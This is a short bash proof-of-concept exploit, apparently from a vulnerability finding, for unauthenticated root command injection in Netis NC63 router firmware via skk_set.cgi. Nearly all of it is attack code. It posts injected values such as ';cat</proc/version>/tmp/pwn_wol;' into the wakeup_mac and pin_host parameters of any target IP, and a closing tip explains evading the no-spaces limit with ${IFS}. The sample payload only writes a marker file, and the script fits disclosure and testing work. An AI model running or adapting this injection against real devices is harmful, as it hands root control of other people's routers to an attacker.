#!/bin/bash
# FIND-0004 PoC — Netis NC63 V3.0.0.3327 skk_set 未过滤命令注入
# 向量1: wakeup_set/wakeup_mac (FUN_0040f0f0, 零过滤)
# 向量2: wps_set/pin_host     (FUN_0040e758, 零过滤, wps_mode=pin 分支)
# 未认证；netis.cgi 以 root 运行 → 注入命令即 root 执行。
# 用法: ./poc_find0004.sh <目标IP> [端口]   例: ./poc_find0004.sh 192.168.1.1 80
set -e
HOST="${1:?usage: $0 <host> [port]}"; PORT="${2:-80}"
URL="http://$HOST:$PORT/cgi-bin/skk_set.cgi"

echo "[*] 向量1 wakeup_set: 注入标记命令（无空格写法）"
curl -s -m 10 "$URL" \
  --data-urlencode "wakeup_set=1" \
  --data-urlencode "wakeup_mac=1;cat</proc/version>/tmp/pwn_wol;"
echo

echo "[*] 向量2 wps_set: pin_host 注入"
curl -s -m 10 "$URL" \
  --data-urlencode "wps_set=1" \
  --data-urlencode "wps_mode=pin" \
  --data-urlencode "wl_idx=0" \
  --data-urlencode "pin_host=1;cat</proc/version>/tmp/pwn_wps;"
echo
echo "[*] 已发送。登录设备检查 /tmp/pwn_wol 与 /tmp/pwn_wps（内容=内核版本）。"
echo "[!] 注意: 参数值不得含字面空格（解析层会破坏）；用 ;cmd; / >file / \${IFS} 构造。"
